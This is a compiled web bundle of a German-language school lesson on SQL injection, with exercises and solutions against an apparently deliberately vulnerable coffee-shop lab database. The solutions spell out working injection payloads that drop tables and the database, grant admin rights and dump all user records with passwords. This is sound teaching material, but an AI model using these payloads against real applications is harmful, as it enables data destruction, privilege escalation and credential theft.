slim",live_py:!0,slim:!0},'email = "reto@gymnasium.ch"\nsql = f"SELECT * FROM students WHERE email = \'{email}\'"\nprint(sql)\n')))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"max(250px, 50% - calc(1 * 0.4em))"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"eingabe-1"},"Eingabe"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:13,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"'; UPDATE students SET grade=6 WHERE id=13; --`\n")))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"max(250px, 50% - calc(1 * 0.4em))"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"sql-abfrage-1"},"SQL-Abfrage"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:14,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM students\nWHERE email = '';\nUPDATE students \nSET grade=6 \nWHERE id=13; --';\n"))))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Mit dieser Eingabe wird zuerst der von der Applikation vorgegebene Befehl korrekt abgeschlossen und dann die Note des Sch\xfclers mit der ID 13 auf eine 6 gesetzt."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:37,mdxType:"Comment"})),(0,r.kt)("admonition",{title:"\xdcbung 3",type:"aufgabe"},(0,r.kt)(k,{type:"state",webKey:"4e434f1b-6605-4199-8ce8-a42909acbf98",mdxType:"Answer"}),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Normalerweise sind einem Angreifer die Details \xfcber die Datenbank, welche hier gegeben sind (bspw. die Spaltennamen) nicht bekannt und m\xfcssen zuerst herausgefunden werden. Mehr dazu im n\xe4chsten Abschnitt."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:38,mdxType:"Comment"})),(0,r.kt)("ol",{parentName:"admonition"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"\xc4ndern Sie die Preise aller Kaffee-Sorten auf 0 Franken."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:39,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"\xc4ndern Sie die Preise einer ausgew\xe4hlten Kaffee-Sorte."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:40,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"L\xf6schen Sie auf der Datenbank die Tabelle ",(0,r.kt)("inlineCode",{parentName:"p"},"coffee")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:41,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"L\xf6schen Sie die ganze Datenbank ",(0,r.kt)("inlineCode",{parentName:"p"},"hfr_hacksql")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:42,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Versuchen Sie dem test-Benutzer mit der E-Mail adresse ",(0,r.kt)("inlineCode",{parentName:"p"},"test@mail.ch")," administrator-Rechte zu geben. Dazu muss das Feld ",(0,r.kt)("inlineCode",{parentName:"p"},"role")," auf den Wert ",(0,r.kt)("inlineCode",{parentName:"p"},"admin")," gesetzt werden."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:43,mdxType:"Comment"})))),(0,r.kt)(k,{type:"text",webKey:"8799718f-a43b-45a5-a127-539c67939026",monospace:!0,mdxType:"Answer"}),(0,r.kt)(c,{webKey:"f5840fa3-a9a7-4c4c-8a14-35e58d0456db",mdxType:"Solution"},(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-1-1"},"Aufgabe 1"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:15,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"'; UPDATE coffee SET price=0; --\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-2-1"},"Aufgabe 2"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:16,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"'; UPDATE coffee SET price=0 WHERE id = 12; --\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-3"},"Aufgabe 3"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:17,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"'; DROP TABLE coffee; --\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-4"},"Aufgabe 4"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:18,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"'; DROP DATABASE inject_demodb; --\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-5"},"Aufgabe 5"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:19,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"'; UPDATE users SET role='admin' WHERE name='test'; --\n")))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("h2",{parentName:"div",id:"mehrere-abfragen-kombinieren-union"},"Mehrere Abfragen kombinieren: ",(0,r.kt)("inlineCode",{parentName:"h2"},"UNION")),(0,r.kt)(o,{parentName:"div",type:"heading",nr:20,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Oftmals weiss man nicht im Voraus, wie das Schema der Datenbank aussieht (bspw. wie die Tabellen heissen und welche Spalten sie enthalten). Deshalb muss dies oft in einem ersten Schritt herausgefunden werden. Doch die einzige M\xf6glichkeit um die Resultate anzuzeigen, ist das mit der Eingabe verbundene Anzeige-Elemente - bei der Coffee-Shop Webseite also die Tabelle unterhalb vom Filter."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:44,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)(N,{parentName:"div",options:{},mdxType:"Figure"},(0,r.kt)("img",{src:t(52713).Z,width:"1107",height:"802"})),(0,r.kt)(o,{parentName:"div",type:"figure",nr:1,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Sollen Abfragen miteinander kombiniert werden, so m\xfcssen die Resultate der beiden ",(0,r.kt)("inlineCode",{parentName:"p"},"SELECT")," Queries also ",(0,r.kt)("strong",{parentName:"p"},"genau gleich viele Spalten")," aufweisen."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:45,mdxType:"Comment"})),(0,r.kt)("div",{style:{className:"slim,compact,left"},className:"flex flex-cards slim compact left"},(0,r.kt)("div",{parentName:"div",style:{flexBasis:"max(250px, 50% - calc(1 * 0.4em))"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("strong",{parentName:"p",className:"underline"},"legodudes")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:46,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("table",{parentName:"div"},(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:"right"},"id"),(0,r.kt)("th",{parentName:"tr",align:"left"},"name"),(0,r.kt)("th",{parentName:"tr",align:"left"},"land"),(0,r.kt)("th",{parentName:"tr",align:"left"},"essen"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"1"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Litty Feuerwehr"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Schweden"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Heisse Schokolade")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"2"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Crazy Lego Dude"),(0,r.kt)("td",{parentName:"tr",align:"left"},"\xd6sterreich"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Spaghetti")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"3"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Elon Marsk"),(0,r.kt)("td",{parentName:"tr",align:"left"},"USA"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Lasagne")))),(0,r.kt)(o,{parentName:"div",type:"table",nr:0,mdxType:"Comment"})))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"max(250px, 50% - calc(1 * 0.4em))"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("strong",{parentName:"p",className:"underline"},"haustiere")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:47,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("table",{parentName:"div"},(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:"right"},"id"),(0,r.kt)("th",{parentName:"tr",align:"left"},"name"),(0,r.kt)("th",{parentName:"tr",align:"left"},"lieblingsfutter"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"1"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Fluffy"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Knochen")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"2"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Whiskers"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Fisch")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"3"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Spike"),(0,r.kt)("td",{parentName:"tr",align:"left"},"\xc4pfel")))),(0,r.kt)(o,{parentName:"div",type:"table",nr:1,mdxType:"Comment"})))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"1400px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT id, name, essen\nFROM legodudes\nUNION\nSELECT id, name, lieblingsfutter\nFROM haustiere;\n")))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"max(250px, 50% - calc(1 * 0.4em))",className:"center"},className:"item card center"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("strong",{parentName:"p",className:"underline"},"Resultat")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:48,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("table",{parentName:"div"},(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:"right"},"id"),(0,r.kt)("th",{parentName:"tr",align:"left"},"name"),(0,r.kt)("th",{parentName:"tr",align:"left"},"essen"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"1"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Fluffy"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Knochen")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"1"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Litty Feuerwehr"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Heisse Schokolade")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"2"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Whiskers"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Fisch")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"2"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Crazy Lego Dude"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Spaghetti")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"3"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Elon Marsk"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Lasagne")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"3"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Spike"),(0,r.kt)("td",{parentName:"tr",align:"left"},"\xc4pfel")))),(0,r.kt)(o,{parentName:"div",type:"table",nr:2,mdxType:"Comment"}))))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Sollen nun alle Spalten von den ",(0,r.kt)("strong",{parentName:"p",className:"underline"},"legodudes")," angezeigt werden, muss auch die Abfrage der Tabelle ",(0,r.kt)("strong",{parentName:"p",className:"underline"},"haustiere")," 4 Spalten zur\xfcckgeben:"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:49,mdxType:"Comment"})),(0,r.kt)("div",{style:{className:"slim,compact,left"},className:"flex flex-cards slim compact left"},(0,r.kt)("div",{parentName:"div",style:{flexBasis:"max(250px, 50% - calc(1 * 0.4em))"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT id, name, land, essen\nFROM legodudes\nUNION\nSELECT id, name, NULL, lieblingsfutter\nFROM haustiere;\n")))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"1400px",className:"center"},className:"item card center"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("strong",{parentName:"p",className:"underline"},"Resultat")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:50,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("table",{parentName:"div"},(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:"right"},"id"),(0,r.kt)("th",{parentName:"tr",align:"left"},"name"),(0,r.kt)("th",{parentName:"tr",align:"left"},"land"),(0,r.kt)("th",{parentName:"tr",align:"left"},"essen"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"1"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Fluffy"),(0,r.kt)("td",{parentName:"tr",align:"left"}),(0,r.kt)("td",{parentName:"tr",align:"left"},"Knochen")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"1"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Litty Feuerwehr"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Schweden"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Heisse Schokolade")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"2"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Whiskers"),(0,r.kt)("td",{parentName:"tr",align:"left"}),(0,r.kt)("td",{parentName:"tr",align:"left"},"Fisch")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"2"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Crazy Lego Dude"),(0,r.kt)("td",{parentName:"tr",align:"left"},"\xd6sterreich"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Spaghetti")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"3"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Spike"),(0,r.kt)("td",{parentName:"tr",align:"left"}),(0,r.kt)("td",{parentName:"tr",align:"left"},"\xc4pfel")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:"right"},"3"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Elon Marsk"),(0,r.kt)("td",{parentName:"tr",align:"left"},"USA"),(0,r.kt)("td",{parentName:"tr",align:"left"},"Lasagne")))),(0,r.kt)(o,{parentName:"div",type:"table",nr:3,mdxType:"Comment"}))))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("h3",{parentName:"div",id:"wie-viele-spalten-hat-eine-tabelle"},"Wie viele Spalten hat eine Tabelle?"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:21,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Um herauszufinden, wie viele Spalten eine abgefragte Tabelle hat, kann Schrittweise nach einer Spalte sortiert werden, wobei der Spaltennamen nicht bekannt sein muss, sondern auch ",(0,r.kt)("inlineCode",{parentName:"p"},"ORDER BY 1")," f\xfcr das sortieren nach der ersten Spalte verwendet werden kann. Sobald eine Fehlermeldung erscheint, ist die Anzahl Spalten bekannt."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:51,mdxType:"Comment"})),(0,r.kt)("admonition",{title:"\xdcbung 4",type:"aufgabe"},(0,r.kt)(k,{type:"state",webKey:"15c1f7b0-ee68-42af-94dd-79b17479cafb",mdxType:"Answer"}),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Wie viele Spalten hat die gefilterte Kaffee-Tabelle? Finden Sie dies heraus, indem Sie folgende Eingabe verwenden und anpassen:"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:52,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"' ORDER BY 1;--\n")),(0,r.kt)(k,{type:"text",webKey:"a7391020-8072-4fa2-8e33-e14e9049b8ed",mdxType:"Answer"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Mit diesen Werkzeugen lassen sich nun auch bspw. alle User inkl. deren Passw\xf6rter herausfinden!"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:53,mdxType:"Comment"})),(0,r.kt)("admonition",{title:"\xdcbung 5",type:"aufgabe"},(0,r.kt)(k,{type:"state",webKey:"2884626b-4f6d-4e1c-aa2f-03ce2f0cfee6",mdxType:"Answer"}),(0,r.kt)("ol",{parentName:"admonition"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Geben Sie in Kombination mit dem ",(0,r.kt)("inlineCode",{parentName:"p"},"UNION")," Befehl eine einzelne Zeile ",(0,r.kt)("inlineCode",{parentName:"p"},"1,2,3,4,5,6,7")," aus."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:54,mdxType:"Comment"})),(0,r.kt)(k,{type:"text",webKey:"09c4837f-34aa-45e6-9a4f-36a3fc273a70",mdxType:"Answer"}),(0,r.kt)("admonition",{parentName:"li",title:"Tipp",type:"note"},(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"\xc4ndern Sie Ihre Eingabe so ab, dass keine Kaffee-Resultate angezeigt werden."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:55,mdxType:"Comment"})))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Zeigen Sie in Kombination mit dem ",(0,r.kt)("inlineCode",{parentName:"p"},"UNION")," Befehl die Datenbankversion und den Datenbanknamen an."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:56,mdxType:"Comment"})),(0,r.kt)(k,{type:"text",webKey:"e336768d-62ed-4f0a-8bad-faeb3d8fdd5e",mdxType:"Answer"}),(0,r.kt)("admonition",{parentName:"li",title:"Tipp",type:"note"},(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"F\xfcr ",(0,r.kt)("strong",{parentName:"p",className:"underline"},"MySQL")," Datenbanken gilt:"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:57,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",style:{},className:"flex flex-cards"},(0,r.kt)("div",{parentName:"div",style:{},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"datenbankversion"},"Datenbankversion"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:22,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT version();\n")))),(0,r.kt)("div",{parentName:"div",style:{},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"datenbankname"},"Datenbankname"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:23,mdxType:"Comment"})),(0,r.kt)(g,{getLabel:e=>["MySQL","PSQL"][e],groupId:"dbs",mdxType:"GTabs"},(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT database();\n")),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT current_database();\n")))))))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Welche Tabellen gibt es auf dieser Datenbank? Welche Spalten gibt es in einer Tabelle?"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:58,mdxType:"Comment"})),(0,r.kt)(k,{type:"text",webKey:"205c866d-5a31-4b41-9beb-0690726cefc4",mdxType:"Answer"}),(0,r.kt)("admonition",{parentName:"li",title:"Tipp",type:"note"},(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"In MySql k\xf6nnen die Namen aller Tabellen in der Datenbank 'test_db' mit folgendem Query abgefragt werden, bzw. die Spalten der Tabelle 'test_table':"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:59,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",style:{},className:"flex flex-cards"},(0,r.kt)("div",{parentName:"div",style:{flexBasis:"350px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"alle-tabellen-einer-datenbank"},"Alle Tabellen einer Datenbank"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:24,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT table_name\nFROM information_schema.tables\nWHERE table_schema='database-name';\n")))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"350px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"spalten-der-tabellen-einer-datenbank"},"Spalten der Tabellen einer Datenbank"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:25,mdxType:"Comment"})),(0,r.kt)(g,{getLabel:e=>["MySQL","PSQL"][e],groupId:"dbs",mdxType:"GTabs"},(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT table_name, column_name\nFROM information_schema.columns\nWHERE table_schema='database-name';\n")),(0,r.kt)("div",null,(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT table_name, column_name\nFROM information_schema.columns\nWHERE table_catalog='database-name' \n    AND table_schema='public';\n")),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"In PSQL gibt es pro Datenbank mehrere Schemas. Mit ",(0,r.kt)("inlineCode",{parentName:"p"},"table_schema")," kann das Schema angegeben werden. Standardm\xe4ssig wird das Schema ",(0,r.kt)("inlineCode",{parentName:"p"},"public")," verwendet."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:60,mdxType:"Comment"}))))))))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Es gibt eine Tabelle mit allen Benutzer - zeigen Sie alle Informationen der Benutzer an und loggen Sie sich anschliessend ein."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:61,mdxType:"Comment"})),(0,r.kt)(k,{type:"text",webKey:"e8202804-21eb-4000-9651-7949591d283a",mdxType:"Answer"}))),(0,r.kt)(c,{webKey:"71a67207-f3d8-47e5-8ac0-1de0dbd7cb96",mdxType:"Solution"},(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-1-2"},"Aufgabe 1"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:26,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"z' UNION SELECT 1,2,3,4,5,6,7;--\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-2-2"},"Aufgabe 2"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:27,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"z' UNION SELECT 1,2,3,4,5,database(),version();--\n\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-3-1"},"Aufgabe 3"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:28,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Tabellen Namen"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:62,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"z' UNION\nSELECT 1,2,3,4,5,6, table_name\nFROM information_schema.tables\nWHERE table_schema='hfr_hacksql'; --\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Spalten Namen"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:63,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"z' UNION\nSELECT 1,2,3,4,5,table_name,column_name\nFROM information_schema.columns\nWHERE table_schema='hfr_hacksql'; --\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-4-1"},"Aufgabe 4"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:29,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"zz' UNION SELECT 1, 2, users.* FROM users;--\n\n")))),(0,r.kt)("div",{className:"footnotes"},(0,r.kt)("hr",{parentName:"div"}),(0,r.kt)("ol",{parentName:"div"},(0,r.kt)("li",{parentName:"ol",id:"fn-1"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Quelle: ",(0,r.kt)("a",{parentName:"p",href:"https://de.wikipedia.org/wiki/SQL-Injection"},"Wikipedia")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:64,mdxType:"Comment"})),(0,r.kt)("p",{parentName:"li"},(0,r.kt)("a",{parentName:"p",href:"#fnref-1",className:"footnote-backref"},"\u21a9"))))))}h.isMDXComponent=!0},52713:(e,a,t)=>{t.d(a,{Z:()=>n});const n=t.p+"assets/images/coffee-shop-79355a63adcdb5176110e1a1c7da436b.png"},55078:(e,a,t)=>{t.d(a,{Z:()=>n});const n=t.p+"assets/images/sbb-autocomplete-3f949d6f6f1d8d518d11613201216f43.svg"}}]);